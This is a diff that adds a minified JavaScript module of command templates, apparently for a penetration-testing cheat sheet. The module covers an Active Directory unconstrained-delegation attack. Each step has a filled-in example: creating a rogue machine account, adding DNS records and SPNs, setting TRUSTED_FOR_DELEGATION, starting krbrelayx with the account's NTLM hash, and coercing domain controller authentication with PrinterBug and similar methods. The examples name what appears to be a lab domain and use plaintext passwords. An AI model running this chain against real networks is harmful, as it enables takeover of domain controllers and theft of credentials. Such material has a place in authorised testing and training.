@@ -1,0 +1,34 @@
+const e=[{title:"Check MachineAccountQuota (MAQ)",description:"Query DC for MachineAccountQuota via LDAP.",template:`netexec ldap {ip} -u {username} -p {password} -M maq
+
+Example:
+netexec ldap dc1.delegate.vl -u A.Briggs -p P4ssw0rd1#123 -M maq`},{title:"Create machine account (Impacket addcomputer)",description:"Add a new machine account to the domain.",template:`impacket-addcomputer -computer-name {computer} -computer-pass {computer_pass} -dc-ip {ip} {domain}/{username}:'{password}'
+
+Example:
+impacket-addcomputer -computer-name furious5 -computer-pass Password123 -dc-ip 192.168.129.140 delegate.vl/N.Thompson:'KALEB_2341'`},{title:"Add DNS A record (krbrelayx dnstool)",description:"Create DNS record for fake machine.",template:`python3 krbrelayx/dnstool.py -u '{domain}\\\\{computer}$' -p '{computer_pass}' --action add --record {record} --data {record_ip} --type A -dns-ip {ip} {domain_controller}
+
+Example:
+python3 krbrelayx/dnstool.py -u 'delegate.vl\\\\furious5$' -p 'Password123' --action add --record furious5.delegate.vl --data 10.10.14.12 --type A -dns-ip 192.168.129.140 dc1.delegate.vl`},{title:"Add SPN (krbrelayx addspn) — via msDS-AdditionalDnsHostName",description:"Add SPN using msDS-AdditionalDnsHostName (works around validatedWrite constraints).",template:`python3 krbrelayx/addspn.py -u '{domain}\\\\{username}' -p '{password}' -s '{spn}' -t '{computer}$' -dc-ip {ip} {domain_controller} --additional
+
+Example:
+python3 krbrelayx/addspn.py -u 'delegate.vl\\\\N.Thompson' -p 'KALEB_2341' -s 'cifs/furious5.delegate.vl' -t 'furious5$' -dc-ip 192.168.129.140 dc1.delegate.vl --additional`},{title:"Add SPN (krbrelayx addspn) — standard",description:"Add SPN (may fail if validatedWrite restricts SPNs).",template:`python3 krbrelayx/addspn.py -u '{domain}\\\\{username}' -p '{password}' -s '{spn}' -t '{computer}$' -dc-ip {ip} {domain_controller}
+
+Example:
+python3 /krbrelayx/addspn.py -u 'delegate.vl\\\\N.Thompson' -p 'KALEB_2341' -s 'cifs/furious5.delegate.vl' -t 'furious5$' -dc-ip 192.168.129.140 dc1.delegate.vl`},{title:"Enable unconstrained delegation (BloodyAD)",description:"Set userAccountControl flag TRUSTED_FOR_DELEGATION on the machine account.",template:`bloodyAD -d {domain} -u {username} -p {password} --host {domain_controller} add uac '{computer}$' -f TRUSTED_FOR_DELEGATION
+
+Example:
+bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'furious5$' -f TRUSTED_FOR_DELEGATION`},{title:"List TRUSTED_FOR_DELEGATION accounts (NetExec nxc ldap)",description:"NetExec can retrieve all computer and user accounts that have the TRUSTED_FOR_DELEGATION flag set.",template:`nxc ldap {ip} -u {username} -p {password} --trusted-for-delegation
+
+Example:
+nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation`},{title:"Compute NTLM (MD4) of machine password",description:"Output NTLM (MD4) hash of the machine account password.",template:`python3 -c "password = '{computer_pass}'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"
+
+Example:
+python3 -c "password = 'Password123'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"`},{title:"Start krbrelayx (export mode) with machine hash",description:"Run krbrelayx in unconstrained-delegation export mode using the machine NTLM hash.",template:`python3 krbrelayx/krbrelayx.py -hashes :{ntlm_hash}
+
+Example:
+python3 krbrelayx/krbrelayx.py -hashes :02cb8258df07966e32677128e5ff1d26`},{title:"Test coercion vectors (netexec coerce_plus)",description:"Test common coercion methods (DFSCoerce, PetitPotam, PrinterBug, etc.).",template:`netexec smb {ip} -u '{computer}$' -p {computer_pass} -M coerce_plus
+
+Example:
+netexec smb dc1.delegate.vl -u 'furious5$' -p Password123 -M coerce_plus`},{title:"Exploit coercion vector (PrinterBug example)",description:"Run coerce_plus with a chosen METHOD and LISTENER to coerce DC authentication to the fake host.",template:`netexec smb {ip} -u '{computer}$' -p {computer_pass} -M coerce_plus -o LISTENER={listener} METHOD=PrinterBug
+
+Example:
+netexec smb dc1.delegate.vl -u 'furious5$' -p Password123 -M coerce_plus -o LISTENER=oxdf.delegate.vl METHOD=PrinterBug`}],t={commands:e};export{e as commands,t as default};
